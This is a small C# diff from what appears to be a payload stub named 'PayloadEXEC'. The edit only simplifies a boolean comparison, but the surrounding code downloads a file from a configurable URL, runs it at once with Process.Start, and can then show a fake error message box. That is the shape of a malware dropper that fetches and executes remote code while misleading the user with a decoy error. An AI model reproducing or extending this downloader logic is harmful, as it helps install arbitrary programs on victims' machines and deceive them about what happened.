@@ -27,7 +27,7 @@ namespace PayloadEXEC
             WebClient webClient = new WebClient();
             webClient.DownloadFile($"{URLToDownload}", $"{OutputFilename}");
             Process.Start($"{OutputFilename}");
-            if (MessageBoxEnabled == true) {
+            if (MessageBoxEnabled) {
                 MessageBox.Show(MessageBoxMessage, MessageBoxTitle, 0, MessageBoxIcon.Error);
             }
         }
